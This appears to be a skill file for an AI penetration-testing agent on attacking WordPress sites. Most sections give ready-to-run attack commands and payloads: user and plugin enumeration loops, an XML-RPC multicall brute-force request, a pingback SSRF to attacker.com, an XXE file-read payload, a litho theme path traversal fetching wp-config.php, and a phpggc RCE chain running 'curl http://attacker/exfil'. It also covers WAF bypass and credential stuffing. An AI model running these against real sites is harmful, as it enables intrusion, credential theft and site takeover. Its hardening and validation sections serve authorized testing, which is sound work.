---
name: wordpress
description: WordPress security testing covering plugin/theme vulnerabilities, REST API abuse, authentication bypass, wp-config disclosure, XML-RPC attacks, PHP object injection in plugins, and version-specific CVEs
---

# WordPress

WordPress powers ~40% of the web and the vast majority of its compromise surface lives in third-party plugins and themes, not core. Most high-impact bugs (CVSS 9.8, no auth) are unauthenticated plugin vulnerabilities — REST endpoint mis-authorization, missing capability checks, account-switching logic, exposed JWT signing keys, and PHP object injection via `unserialize()` on stored form data. WordPress core is rarely the weakest link; enumerate plugins first.

## Attack Surface

**Core Surfaces**
- REST API: `/wp-json/` — exposed by default, with namespace and route enumeration
- XML-RPC: `/xmlrpc.php` — enabled by default, system.multicall enables 1-request brute force
- Admin AJAX: `/wp-admin/admin-ajax.php` — `wp_ajax_nopriv_*` hooks often unauthenticated
- Login: `/wp-login.php`, `/wp-admin/`
- Upload: `/wp-content/uploads/`
- Cron: `/wp-cron.php`
- Config: `wp-config.php`, `wp-config.php.bak`, `.wp-config.php.swp`, `wp-config.bak`

**Plugin / Theme Surfaces**
- Custom REST routes registered via `register_rest_route()`
- Admin AJAX actions registered via `add_action('wp_ajax_*', ...)`
- Shortcodes rendered server-side (`add_shortcode`)
- Custom endpoints (file download, resume builder, social-login fallback)
- Account-switching / user-switching functions
- Custom form handlers (`admin-post.php` actions)
- File upload handlers bypassing `wp_handle_upload` checks

**Database & Files**
- `wp_users`, `wp_usermeta`, `wp_options` (autoload), `wp_posts`, `wp_postmeta`
- `wp-content/uploads/` (year/month folders, original + thumbnails)
- `wp-content/plugins/`, `wp-content/themes/`, `wp-content/upgrade/`, `wp-content/debug.log`
- `wp-includes/`, `wp-admin/`

**Auth Surface**
- Application passwords (since 5.6) — `/wp-admin/authorize-application.php`
- Cookie-based: `wordpress_logged_in_*`, `wordpress_sec_*`
- Nonces: `wp_nonce_field`, `wp_rest` nonce in REST API

## High-Value Targets

- `/wp-json/wp/v2/users` — exposes user IDs, slug, name, description (default unauthenticated)
- `/wp-json/<plugin-namespace>/<route>` — third-party plugin endpoints, often missing `permission_callback`
- `/xmlrpc.php` — `wp.getUsersBlogs`, `system.multicall` brute force, pingback SSRF
- `admin-ajax.php?action=<X>` — `wp_ajax_nopriv_<X>` actions run as anonymous
- `wp-content/plugins/<slug>/readme.txt` — version disclosure
- `wp-content/debug.log` — when `WP_DEBUG_LOG` is on in production
- `wp-config.php~`, `wp-config.php.bak`, `wp-config.old` — backup config files
- `wp-content/backup-*/` — automated backup dumps
- `wp-content/uploads/<year>/<month>/` — directory listing when no index.html

## Reconnaissance

**Version Detection**
```bash
# Header / generator tag
curl -sI https://target/ | grep -i 'x-powered-by\|generator'
curl -s https://target/ | grep -i 'wp-content\|wordpress'

# Readme and version files
curl -s https://target/readme.html | grep -i 'version'
curl -s https://target/wp-includes/version.php
curl -s https://target/wp-admin/upgrade.php
curl -s https://target/feed/  # generator tag in RSS
```

**User Enumeration**
```bash
# REST API (default unauthenticated)
curl -s 'https://target/wp-json/wp/v2/users?per_page=100'

# Author archive (different status code for valid user)
for i in 1 2 3 4 5; do
  curl -s -o /dev/null -w "%{http_code} /?author=$i\n" "https://target/?author=$i"
done

# Login form (invalid user vs invalid password differ)
curl -s -X POST 'https://target/wp-login.php' \
  -d 'log=admin&pwd=wrong&wp-submit=Log+In' | grep -i 'error'

# WPScan
wpscan --url https://target --enumerate u --no-banner
```

**Plugin Enumeration**
```bash
# Passive — from page source
curl -s https://target/ | grep -oE 'wp-content/plugins/[^/]+' | sort -u

# Active probing (timing-based, noisy)
for plugin in akismet contact-form-7 woocommerce yoast-seo wordfence elementor \
             really-simple-ssl updraftplus wp-super-cache all-in-one-seo \
             duplicate-post jetpack classic-editor wpforms; do
  code=$(curl -s -o /dev/null -w '%{http_code}' "https://target/wp-content/plugins/$plugin/")
  echo "$plugin: $code"  # 200/403 = likely present
done

# WPScan aggressive
wpscan --url https://target --enumerate p --plugins-detection aggressive

# Nuclei templates (1,261 wordpress + 1,103 wp-plugin templates in nuclei-templates)
nuclei -u https://target -t technologies/wordpress/ -t http/vulnerabilities/wordpress/
```

**Theme Enumeration**
```bash
curl -s https://target/ | grep -oE 'wp-content/themes/[^/]+' | sort -u
curl -s https://target/wp-content/themes/<slug>/style.css | head -20
```

**REST API Namespace Discovery**
```bash
curl -s https://target/wp-json/ | jq '.namespaces[]'
curl -s https://target/wp-json/<namespace>/ | jq '.routes | keys[]'
```

**CVE Mapping (post-detection)**
```bash
# Once a plugin + version is known, search nuclei/WPScan DB
searchsploit wordpress <plugin-slug> <version>
exploit_db_search "<plugin-slug> <version>"   # via the new tool
exploit_search "CVE-2025 wordpress <plugin-slug>"   # via Tavily
```

## Key Vulnerabilities

### Unauthenticated Plugin Vulnerabilities (most critical)

Plugins are where 9.8 unauth CVEs live. Pattern categories seen in 2024-2025:

**Missing `permission_callback` on REST routes** — `register_rest_route()` defaults to no permission check when the callback is omitted or returns true.
```bash
# Identify routes from namespace discovery
curl -s https://target/wp-json/<namespace>/<route>
# Try without auth, with admin auth (if you have creds), with subscriber auth
```

**Missing capability checks in admin AJAX handlers**
```php
// VULNERABLE: registers for both auth and nopriv
add_action('wp_ajax_nopriv_my_action', 'do_dangerous_thing');
add_action('wp_ajax_my_action', 'do_dangerous_thing');
function do_dangerous_thing() {
    // No current_user_can() check
    wp_set_auth_cookie($user_id);  // auth bypass
    die();
}
```

**Account-switching / user-impersonation via cookie**
- Pattern: plugin reads a user ID or token from cookie/header, calls `wp_set_auth_cookie()` without verifying the caller already had access.
- Examples: CVE-2025-5947 (Service Finder `service_finder_switch_back()`), CVE-2025-6895 (Melapress `get_valid_user_based_on_token()`), CVE-2025-9209 (RestroPress JWT forgery via `/wp-json/wp/v2/users`).
- Test: send a cookie with another user's ID/token and try privileged operations.

**Hard-coded / default JWT signing key**
- Pattern: plugin uses JWT auth; if `SECRET_KEY` config is empty, falls back to a hard-coded key in plugin source.
- Example: CVE-2025-8625 (Copypress Rest API).
- Test: extract the default key from the plugin source, forge admin JWT, hit protected routes.

**Password reset / confirmation key abuse**
- Pattern: `confirmation_key` not set or predictable; plugin logs user in after email verification using only the email.
- Example: CVE-2025-4973 (Workreap), CVE-2025-5288 (REST API Custom API Generator).
- Test: trigger a password reset, intercept the link, change email, replay the verification request.

**User meta manipulation during registration**
- Pattern: registration handler updates `wp_usermeta` with attacker-supplied values, including role-promoting meta like `wp_capabilities`.
- Example: CVE-2025-4334 (Simple User Registration).
- Test: register a user, inject `meta[wp_capabilities][administrator]=1` in the POST.

### PHP Object Injection (POI) in Plugins

WordPress plugins routinely store form submissions in `wp_postmeta` and then `unserialize()` them later. `unserialize()` on attacker-controlled data → arbitrary object instantiation → gadget chain → RCE or file deletion.

- Example: CVE-2025-7384 — Database for Contact Form 7 / WPForms / Elementor Forms plugin, `get_lead_detail()` unserializes stored form data; POP chain in Contact Form 7 deletes `wp-config.php` → reinstall → RCE.
- Example: CVE-2023-6933 — Better Search Replace < 1.4.5.
- Example: CVE-2024-8529 — LearnPress SQLi via POI.

```bash
# POI PoC shape — depends on the gadget chain (Laravel/Monolog/ContactForm7/etc.)
# Use phpggc with the appropriate framework target
phpggc -l  # list chains
phpggc Monolog/RCE2 system 'curl http://attacker/exfil' | base64
# Inject the serialized payload via the vulnerable input (form field, cookie, query param)
```

### wp-config.php Disclosure

Database credentials, AUTH_KEY, AUTH_SALT, table prefix. Disclosure paths:

- **Backup files** in webroot: `wp-config.php~`, `.bak`, `.old`, `.swp`, `.save`
- **Plugin path traversal** downloading the file: e.g. revslider, Resume Builder, litho theme fontfamily LFI
- **Exposed source via version control**: `.git/`, `.svn/`, `wp-config.php` tracked in VCS
- **Debug logging** that includes config values
- **Server misconfig** allowing direct access (rare, but Apache/Nginx alias mistakes)

```bash
# Backup files
for ext in '~' '.bak' '.old' '.swp' '.save' '.orig' '.1' '.txt'; do
  curl -s -o /dev/null -w "%{http_code} wp-config.php$ext\n" "https://target/wp-config.php$ext"
done

# .git
curl -s -o /dev/null -w "%{http_code}\n" "https://target/.git/config"
curl -s -o /dev/null -w "%{http_code}\n" "https://target/.git/HEAD"
```

### XML-RPC Abuse

`xmlrpc.php` exposes `wp.getUsersBlogs` (auth check), `system.multicall` (1 request, many login attempts), `pingback.ping` (SSRF), and many `wp.*` methods. Mitigations vary; many plugins still leave it open.

```bash
# Username enumeration via system.multicall
curl -s -X POST https://target/xmlrpc.php -d '<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params>
    <param><value>
      <array><data>
        <value><struct>
          <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
          <member><name>params</name><value><array><data>
            <value><string>admin</string></value>
            <value><string>wrongpass1</string></value>
          </data></array></value></member>
        </struct></value>
        <value><struct>
          <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
          <member><name>params</name><value><array><data>
            <value><string>nonexistent</string></value>
            <value><string>wrongpass2</string></value>
          </data></array></value></member>
        </struct></value>
      </data></array>
    </value></param>
  </params>
</methodCall>'

# Pingback SSRF (internal port scan)
curl -s -X POST https://target/xmlrpc.php -d '<?xml version="1.0"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>http://attacker.com/bait</string></value></param>
    <param><value><string>https://target/some/post/url/</string></value></param>
  </params>
</methodCall>'
```

### Authentication Bypass Patterns

Beyond plugin-specific account-switching bypasses:
- **Empty/missing nonce validation** on state-changing endpoints
- **Insecure direct password reset** — comparing `confirmation_key` to `null` or `''`
- **Privilege escalation via user meta** during registration (see above)
- **Subscriber → Admin role manipulation** by POSTing extra fields to profile-update endpoints
- **Cookie tampering** when auth relies on a known/guessable value (user ID encoded in cookie, no HMAC)

### XML External Entity (XXE)

Plugin/theme code that parses uploaded XML (WooCommerce import, WP All Import, etc.) without disabling external entities.

```bash
# XXE payload for file read
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><name>&xxe;</name></root>
```

### SQL Injection in Plugins

WordPress core uses `$wpdb->prepare()` consistently, but plugins don't. Common sinks:
- `$_GET['id']`, `$_POST['id']` passed to `$wpdb->query()` or `$wpdb->get_results()`
- `get_results($wpdb->prepare("SELECT ... WHERE id=%d", $_GET['id']))` — `%d` is fine; raw concatenation is not
- Search/filter inputs in custom admin tables
- Sorting parameters in `WP_List_Table`

### Cross-Site Scripting (XSS) — Most Common by Volume

XSS is the most reported WP vuln class year over year. Sinks in plugins:
- Shortcode attributes rendered without `esc_attr()`
- Custom admin pages echoing `$_GET` / `$_POST` without `esc_html()`
- Stored XSS in custom post types (testimonial, feedback, support ticket) shown to admins
- Reflected XSS in admin search/filter UIs

Even an authenticated XSS to admin = full site takeover (theme/plugin editor, plugin installer).

### Directory Traversal & Arbitrary File Operations

Patterns:
- File operations using `$_GET['file']` or `$_POST['file']` joined to a base path
- ZIP extract without path sanitization (zip slip)
- Theme/plugin editor with insufficient path checks
- Font family / template file loaders (litho theme CVE)

```bash
# litho theme LFI
curl -X POST https://target/wp-admin/admin-ajax.php \
  -d 'action=litho_remove_font_family_action_data' \
  -d 'fontfamily=../../../../wp-config.php'
```

## Bypass Techniques

- **CloudFlare / Sucuri bypass**: real IP via `securitytrails.com`, censys, shodan; direct origin hit
- **WAF bypass on auth brute force**: rotate User-Agent, mix XML-RPC + REST + login, slow drip (under threshold), credential stuffing with known breach pairs
- **Nonce bypass**: when nonce is generated client-side (a bug) or validation is conditional
- **Capability check bypass**: when `current_user_can()` is called with a capability the attacker can satisfy (e.g. `read` instead of `manage_options`)
- **SameSite cookie bypass**: cross-site POST via form submission if cookies are `SameSite=None`
- **Path normalization differentials**: `wp-content/plugins/plugin//file`, double-encoding, mixed case
- **JSON vs form encoding**: many handlers only validate form-encoded input, not JSON body (or vice versa)

## Tenant / Multi-Site Isolation

WordPress Multisite (`WP_ALLOW_MULTISITE`) with subdirectory or subdomain mapping:
- Site admins in one site should not access other sites
- `switch_to_blog()` returns to original blog, but transient/cache keys can leak across sites
- Upload directory isolation breaks when plugins hardcode paths
- Test: cross-site IDOR via shared admin endpoints, plugin-shared options tables

## Tooling

**Recon & Detection**
- WPScan (free for non-commercial, paid API for full vuln DB)
- Nuclei templates: `technologies/wordpress/`, `http/vulnerabilities/wordpress/`, `http/vulnerabilities/wp-plugin/`
- CMSMap
- Nmap NSE scripts: `http-wordpress-enum`, `http-wordpress-brute`

**Exploitation**
- `exploit_db_search` (kael tool) for direct EDB lookups by plugin or CVE
- `exploit_search` (Tavily-backed) for PoC + GitHub + Nuclei templates
- `web_search` for adaptation guidance and recent writeups
- phpggc for object injection gadget chains (Laravel, Monolog, Symfony, etc.)
- Burp Suite for auth-state testing, cookie tampering, REST replays

**Hardening Checks (when authorized for advisory)**
- `wp-config.php` permissions (440, owner = web user)
- `WP_DEBUG` and `WP_DEBUG_LOG` off in production
- File editor disabled: `define('DISALLOW_FILE_EDIT', true)`
- Plugin/theme auto-update policy
- Application passwords disabled if unused
- XML-RPC disabled if not used: `add_filter('xmlrpc_enabled', '__return_false')`
- Login rate limiting + 2FA

## Testing Methodology

1. **Fingerprint** — confirm WP, get version, identify hosting/WAF
2. **Enumerate** — plugins, themes, users (passive + active), REST namespaces
3. **Map CVEs** — for each discovered plugin/theme with version, check WPScan DB, Patchstack, nuclei templates, exploit-db
4. **Test core entry points** — `wp-config.php` backups, `.git`, debug.log, xmlrpc.php (multicall brute force, pingback SSRF), user enumeration
5. **Test REST API** — namespace discovery, hit every route with no/low/high auth, compare responses for IDOR
6. **Test admin AJAX** — enumerate `wp_ajax_nopriv_*` actions via plugin source (if available) or guessing common patterns
7. **Test plugin-specific auth flows** — registration, password reset, social login, account switching, JWT issuance
8. **Test object injection** — submit form data with serialized payloads, check responses/storage
9. **Test file handling** — path traversal in file download, ZIP extract, theme editor, font loader
10. **Post-auth (if creds obtained)** — privilege escalation via user meta, plugin install RCE, theme editor

## Validation Requirements

- **Unauth plugin RCE**: PoC request + response showing file deletion, command exec, or admin account creation without any auth header/cookie
- **Auth bypass**: PoC request + evidence of access (admin bar, restricted content) using a victim user ID/token, with the attacker never authenticating as that user
- **wp-config disclosure**: full file contents retrieved (DB password, AUTH_KEY visible)
- **Object injection**: serialized payload sent → gadget chain triggered → file deletion or command exec verified out-of-band
- **XSS**: payload in stored/reflected sink, executes in admin's browser (e.g. via screenshot of admin viewing the payload page, or out-of-band callback)
- **IDOR**: same request as user A vs user B returns different content for resources owned by B; explicit access to B's data confirmed

## Common False-Positive Patterns

- `wp-json/` returns 404 — WP installed in subdirectory, or pretty permalinks off
- `xmlrpc.php` returns 405 — method is `POST` only; some security plugins intercept with 403 instead
- `wp-login.php` doesn't accept `wp-submit` — custom login page or form
- `?author=1` returns 200 for both valid and invalid users — mod_rewrite or plugin normalizes response
- `/wp-content/plugins/<slug>/` returns 200 for missing plugins — some hosts serve 200 + custom 404 page

Always confirm with response content (look for plugin-specific strings, version numbers) rather than status code alone.
